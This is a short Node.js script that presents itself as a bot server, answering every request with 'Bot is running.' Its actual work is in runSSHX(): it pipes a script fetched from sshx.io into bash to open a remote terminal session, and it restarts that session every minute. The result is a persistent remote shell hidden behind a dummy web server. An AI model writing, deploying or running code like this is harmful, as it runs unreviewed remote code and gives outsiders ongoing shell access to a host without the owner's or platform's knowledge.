const http = require("http");
const { spawn } = require("child_process");

const PORT = process.env.PORT || 3000;

http.createServer((req, res) => {
  res.writeHead(200, { "Content-Type": "text/plain" });
  res.end("Bot is running.\n");
}).listen(PORT, () => {
  console.log(`Server is listening on port ${PORT}`);
});

function runSSHX() {
  console.log("Starting sshx.io session...");
  const child = spawn("bash", ["-c", "curl -sSf https://sshx.io/get | bash -s run"], {
    stdio: "inherit",
    shell: false
  });

  child.on("close", (code) => {
    console.log(code);
    setTimeout(runSSHX, 60000);
  });
}

runSSHX();

console.log("done");